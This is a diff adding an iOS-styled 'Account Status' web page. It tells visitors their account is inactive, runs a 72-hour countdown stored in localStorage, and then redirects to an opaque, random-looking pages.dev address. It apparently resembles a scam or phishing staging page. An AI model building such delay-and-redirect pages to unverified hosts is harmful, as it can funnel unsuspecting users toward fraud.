@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Account Status</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", sans-serif;
+      background: linear-gradient(180deg, #f2f2f7 0%, #e5e5ea 100%); /* iOS 17 gradient background */
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.8); /* Semi-transparent iOS-style background */
+      backdrop-filter: blur(20px); /* iOS 17 glassmorphism effect */
+      width: 100%;
+      max-width: 400px;
+      margin: 20px;
+      border-radius: 24px; /* Softer, iOS-like corners */
+      padding: 24px;
+      text-align: center;
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #000000; /* iOS 17 black */
+      letter-spacing: -0.5px;
+    }
+
+    p {
+      color: #3c3c43; /* iOS 17 secondary text color */
+      font-size: 17px; /* iOS standard body text size */
+      line-height: 1.5;
+      margin-bottom: 20px;
+      opacity: 0.6;
+    }
+
+    .status-icon {
+      width: 64px;
+      height: 64px;
+      border-radius: 20px; /* iOS 17-style rounded square icon */
+      background: linear-gradient(135deg, #E6E6FA	 0%, #E0FFFF 100%); /* iOS vibrant orange gradient */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 32px;
+      color: #ffffff;
+      margin: 0 auto 16px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+
+    .timer {
+      font-size: 28px; /* Larger, iOS-like timer font */
+      font-weight: 700;
+      color: #007aff; /* iOS blue for primary actions */
+      margin-top: 12px;
+      font-family: "SF Mono", monospace; /* iOS 17 timer font */
+      letter-spacing: -0.5px;
+    }
+
+    .small {
+      font-size: 13px; /* iOS footnote size */
+      color: #3c3c43; /* iOS secondary text */
+      opacity: 0.5;
+      margin-top: 8px;
+      font-weight: 500;
+    }
+
+    /* Ensure responsiveness for all mobile screens */
+    @media (max-width: 768px) {
+      .container {
+        margin: 16px;
+        padding: 20px;
+      }
+      h1 {
+        font-size: 22px;
+      }
+      p {
+        font-size: 16px;
+      }
+      .timer {
+        font-size: 24px;
+      }
+    }
+
+    /* iPhone 15 Pro Max and similar large screens */
+    @media (min-width: 430px) {
+      .container {
+        max-width: 380px;
+      }
+    }
+
+    /* Dynamic safe-area insets for iOS devices */
+    @supports (padding: env(safe-area-inset-top)) {
+      .container {
+        padding-top: calc(20px + env(safe-area-inset-top));
+        padding-bottom: calc(20px + env(safe-area-inset-bottom));
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="container">
+    <div class="status-icon" id="statusIcon"><svg xmlns="http://www.w3.org/2000/svg" width="1.5em" height="1.5em" viewBox="0 0 24 24"><rect width="24" height="24" fill="none"/><path fill="#007aff" d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,20a9,9,0,1,1,9-9A9,9,0,0,1,12,21Z"/><rect width="2" height="7" x="11" y="6" fill="#007aff" rx="1"><animateTransform attributeName="transform" dur="9s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></rect><rect width="2" height="9" x="11" y="11" fill="#007aff" rx="1"><animateTransform attributeName="transform" dur="0.75s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></rect></svg></div>
+    <p id="message">Account Currently Inactive<br>Activation may take up to 72 Hours.</p>
+    <div class="timer" id="timer">XXXXXXX</div>
+  </div>
+
+  <script>
+    const timerElement = document.getElementById("timer");
+    const statusIcon = document.getElementById("statusIcon");
+    const title = document.getElementById("title");
+    const message = document.getElementById("message");
+    const container = document.getElementById("container");
+
+    // Check if user already has a start time in localStorage
+    let startTime = localStorage.getItem("activationStart");
+    const duration = 72 * 60 * 60 * 1000; // 72 hours in ms
+
+    if (!startTime) {
+      startTime = Date.now();
+      localStorage.setItem("activationStart", startTime);
+    } else {
+      startTime = parseInt(startTime, 10);
+    }
+
+    const endTime = startTime + duration;
+
+    function updateTimer() {
+      const now = Date.now();
+      const remaining = endTime - now;
+
+      if (remaining <= 0) {
+        // Redirect when time ends
+        window.location.href = "https://zufvoql5xqh6d1zljquitd1uwteyswvkqwcexlsprjnit5f46blnxe4f3t.pages.dev/Status";
+        return;
+      }
+
+      // Calculate time left
+      const hours = Math.floor(remaining / (1000 * 60 * 60));
+      const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
+      const ms = Math.floor((remaining % 1000));
+
+      // Format with leading zeros
+      const h = String(hours).padStart(2, "0");
+      const m = String(minutes).padStart(2, "0");
+      const s = String(seconds).padStart(2, "0");
+      const msStr = String(ms).padStart(3, "0");
+
+      timerElement.textContent = `${h}:${m}:${s}:${msStr}`;
+      requestAnimationFrame(updateTimer);
+    }
+
+    updateTimer();
+  </script>
+</body>
+</html>
